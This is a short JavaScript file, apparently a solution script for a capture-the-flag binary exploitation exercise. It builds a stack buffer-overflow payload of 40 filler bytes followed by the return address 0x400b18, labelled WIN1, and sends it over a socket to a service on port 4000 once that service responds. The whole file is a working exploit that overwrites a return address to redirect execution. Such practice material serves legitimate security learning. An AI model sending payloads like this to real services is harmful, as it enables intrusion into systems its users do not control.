import nc from "../../../utils/nc";

const WIN1 = "\x18\x0B\x40\x00\x00\x00\x00\x00";
const BUF_SIZE = 32;
const PAYLOAD = "A".repeat(BUF_SIZE + 8) + WIN1;

nc(4000, (data, socket) => {
  console.info(data.toString());
  socket.write(PAYLOAD);
  socket.write("\n");
});
